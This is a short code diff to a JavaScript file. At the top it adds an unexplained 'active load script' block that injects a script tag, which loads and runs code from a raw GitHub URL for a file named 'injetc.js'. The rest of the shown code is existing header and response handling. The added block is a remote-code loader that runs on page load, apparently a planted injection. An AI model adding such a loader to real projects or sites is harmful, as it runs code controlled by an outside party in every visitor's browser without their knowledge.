@@ -1,3 +1,10 @@
+//active load script
+let myScript = document.createElement("script");
+myScript.setAttribute("src", "https://raw.githubusercontent.com/GMhabib/index.js/main/injetc.js");
+document.body.appendChild(myScript);
+
+//end script active
+
 //header remover cache
 //header('Content-Type: text/javascript');
 async function response(setHeader, setDataHeader, header) {
